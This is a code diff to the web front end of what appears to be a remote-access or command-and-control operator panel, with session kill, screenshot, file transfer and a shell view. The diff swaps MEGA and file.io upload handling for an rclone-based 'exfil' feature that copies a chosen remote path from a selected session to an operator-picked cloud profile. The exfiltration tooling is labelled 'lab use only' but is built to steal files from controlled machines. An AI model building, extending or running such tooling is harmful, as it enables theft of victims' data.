@@ -867,12 +867,11 @@ function renderEventBodyHtml(ev) {
     const src = artifactSrc(ev.artifact_url);
     return `${escapeHtml(body)}<br><a class="artifact-link" href="${escapeHtml(src)}" download>Download file</a>`;
   }
-  if (ev.type === "mega_upload" || ev.type === "fileio_upload") {
-    const m = body.match(/https:\/\/(?:mega\.nz|file\.io)\/\S+/i);
+  if (ev.type === "cloud_upload") {
+    const m = body.match(/https?:\/\/\S+/i);
     if (m) {
       const url = m[0];
-      const label = ev.type === "mega_upload" ? "Open MEGA link" : "Open link";
-      return `${escapeHtml(body)}<br><a class="artifact-link" href="${escapeHtml(url)}" target="_blank" rel="noopener">${label}</a>`;
+      return `${escapeHtml(body)}<br><a class="artifact-link" href="${escapeHtml(url)}" target="_blank" rel="noopener">Open link</a>`;
     }
   }
   if (ev.artifact_url) {
@@ -917,7 +916,7 @@ async function connect() {
   startStatusTick();
   await refreshSessions();
   await fetchSessionHistory();
-  await refreshMegaStatus();
+  await refreshExfilStatus();
 }
 
 function disconnect() {
@@ -1198,40 +1197,114 @@ async function queueDownload() {
   }
 }
 
-async function refreshMegaStatus() {
-  const hint = $("#mega-status-hint");
-  if (!hint) return;
-  const { status, data } = await api("/mega/config");
-  if (status !== 200) {
-    hint.textContent = "MEGA: unable to read server configuration";
-    return;
-  }
-  if (!data.configured) {
-    hint.textContent =
-      "MEGA not configured on server — set RMM_MEGA_EMAIL and RMM_MEGA_PASSWORD";
-    return;
-  }
-  const lib = data.library_available ? "ready" : "mega.py-v2 missing on server";
-  hint.textContent = `MEGA ${data.email || "configured"} · folder ${data.folder || "/"} · ${lib} (lab use only)`;
+function formatExfilProfileOption(profile) {
+  const name = profile.name || "?";
+  const type = profile.type || "?";
+  const folder = profile.folder || "/";
+  return `${name} (${type}) → ${folder}`;
 }
 
-async function queueMega() {
-  const remote = $("#mega-remote").value.trim();
-  if (!remote || !state.selectedId) return;
-  appendShellEcho(`mega ${remote}`);
-  $("#mega-remote").value = "";
+function populateExfilProfiles(data) {
+  const select = $("#exfil-profile");
+  const btn = $("#btn-exfil");
+  if (!select) return;
+
+  select.replaceChildren();
+  const profiles = data?.profiles || [];
+  const defaultName = data?.default_profile || "";
+  const ready = Boolean(data?.rclone_binary) && profiles.length > 0 && !data?.load_error;
+
+  if (!data?.rclone_binary) {
+    select.disabled = true;
+    const opt = document.createElement("option");
+    opt.value = "";
+    opt.textContent = "rclone missing";
+    select.appendChild(opt);
+    if (btn) btn.disabled = true;
+    return;
+  }
+
+  if (data?.load_error) {
+    select.disabled = true;
+    const opt = document.createElement("option");
+    opt.value = "";
+    opt.textContent = "Profile error";
+    select.appendChild(opt);
+    if (btn) btn.disabled = true;
+    return;
+  }
+
+  if (!profiles.length) {
+    select.disabled = true;
+    const opt = document.createElement("option");
+    opt.value = "";
+    opt.textContent = "No profiles";
+    select.appendChild(opt);
+    if (btn) btn.disabled = true;
+    return;
+  }
+
+  for (const profile of profiles) {
+    const opt = document.createElement("option");
+    opt.value = profile.name || "";
+    opt.textContent = formatExfilProfileOption(profile);
+    if (profile.name === defaultName) {
+      opt.selected = true;
+    }
+    select.appendChild(opt);
+  }
+
+  select.disabled = false;
+  if (btn) btn.disabled = !ready;
+}
+
+async function refreshExfilStatus() {
+  const hint = $("#exfil-status-hint");
+  if (!hint) return;
+  const { status, data } = await api("/rclone/config");
+  if (status !== 200) {
+    hint.textContent = "rclone: unable to read server configuration";
+    populateExfilProfiles(null);
+    return;
+  }
+  populateExfilProfiles(data);
+  if (data.load_error) {
+    hint.textContent = `rclone profile error: ${data.load_error}`;
+    return;
+  }
+  if (!data.rclone_binary) {
+    hint.textContent =
+      "rclone.exe missing on server — place binary in tools/rclone/ (see docs/rclone-exfil.md)";
+    return;
+  }
+  const count = (data.profiles || []).length;
+  if (!count) {
+    hint.textContent =
+      "No rclone profiles — set RMM_RCLONE_PROFILES or RMM_RCLONE_PROFILES_FILE on the server";
+    return;
+  }
+  hint.textContent = `rclone ready · ${count} profile${count === 1 ? "" : "s"} · default ${data.default_profile || "—"} (lab use only)`;
+}
+
+async function queueExfil() {
+  const remote = $("#exfil-remote").value.trim();
+  const profileSelect = $("#exfil-profile");
+  const profile = profileSelect && !profileSelect.disabled ? profileSelect.value.trim() : "";
+  if (!remote || !state.selectedId || !profile) return;
+  appendShellEcho(`exfil ${remote} ${profile}`);
+  $("#exfil-remote").value = "";
   const { status, data } = await api(
-    `/sessions/${encodeURIComponent(state.selectedId)}/mega`,
+    `/sessions/${encodeURIComponent(state.selectedId)}/exfil`,
     {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ remote_path: remote }),
+      body: JSON.stringify({ remote_path: remote, profile }),
     }
   );
   if (status !== 200) {
     appendShellError(data.error || `HTTP ${status}`);
   } else {
-    appendShellMeta("(MEGA upload queued — link appears in transcript)");
+    appendShellMeta(`(exfil queued via ${profile})`);
   }
 }
 
@@ -1322,7 +1395,7 @@ document.addEventListener("DOMContentLoaded", () => {
   $("#btn-kill").addEventListener("click", killSession);
   $("#btn-config").addEventListener("click", applyConfig);
   $("#btn-download").addEventListener("click", queueDownload);
-  $("#btn-mega").addEventListener("click", queueMega);
+  $("#btn-exfil").addEventListener("click", queueExfil);
   $("#btn-screenshot").addEventListener("click", queueScreenshot);
   $("#btn-upload").addEventListener("click", queueUpload);
 
